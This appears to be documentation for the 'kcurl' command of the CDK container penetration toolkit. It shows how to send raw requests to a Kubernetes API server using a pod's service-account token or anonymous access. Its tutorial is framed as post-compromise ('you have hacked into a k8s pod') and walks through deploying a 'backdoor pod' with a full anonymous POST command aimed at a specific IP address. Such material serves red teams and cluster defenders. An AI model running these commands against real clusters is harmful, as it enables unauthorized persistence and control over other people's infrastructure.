
Connect K8s api-server with local service account token and make custom HTTP requests.
  
连接K8s api-server发起自定义HTTP请求。

## Usage
help msg and usage:
```
./cdk kcurl
```

send request
```
cdk kcurl (default|anonymous|<service-account-token-path>) (get|post) <url> ["<post-data>"]

default: auth k8s api-server with pod's default service-account token
anonymous: auth k8s api-server with cluster-role "system:anonymous"
<token-path>: auth k8s api-server with user-specified service-account token path
```

## Example
Use K8s pod default service account token(saved in `/var/run/secrets/kubernetes.io/serviceaccount/token`) to list nodes.

```
cdk kcurl default get "https://192.168.0.234:6443/api/v1/nodes"
```
![](https://static.cdxy.me/20201130102300_uQLpWZ_Screenshot.jpeg)

## Tutorial: create new pod using CDK `kcurl` command

Now you have hacked into a k8s pod and find k8s api-server endpoint, you want to run `kubectl apply -f <file>` to deploy a backdoor pod to 
 cluster, but there's no kubectl in current pod.   
  
You can use CDK `kcurl` command instead.
  
pod config ubuntu.yaml:
```
apiVersion: v1
kind: Pod
metadata:
  name: cdxy-test-2021
spec:
  containers:
  - image: ubuntu:latest 
    name: container
```
  
this is the pod you want to deploy, first you can run local kubectl to get JSON request params.  

```
kubectl create -f ubuntu.yaml --edit -o json
```

Another way to translate any kubectl commands to JSON data is using `--v` param.  
For example we dump request data in this case:  
  
```
kubectl apply -f ubuntu.yaml --v=8
```

then you can find HTTP request URI and POST data in kubectl log:

![](https://static.cdxy.me/cuimage/20210112165949_UdNq9J_Screenshot.jpeg)

wrap highlighted "URL" and "Data" string with single quote, then copy it to CDK `kcurl` command: 

```
/cdk kcurl anonymous post 'https://101.132.101.69:6443/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply' '{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"cdxy-test-2021\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"args\":[\"sleep\",\"infinity\"],\"image\":\"ubuntu:latest\",\"name\":\"container\"}]}}\n"},"name":"cdxy-test-2021","namespace":"default"},"spec":{"containers":[{"args":["sleep","infinity"],"image":"ubuntu:latest","name":"container"}]}}'
```

Now you can transfer `kubectl apply` requests to CDK `kcurl` command and manipulate K8s api-server in any pods.

![](https://static.cdxy.me/cuimage/20210112170934_HTckSj_Screenshot.jpeg)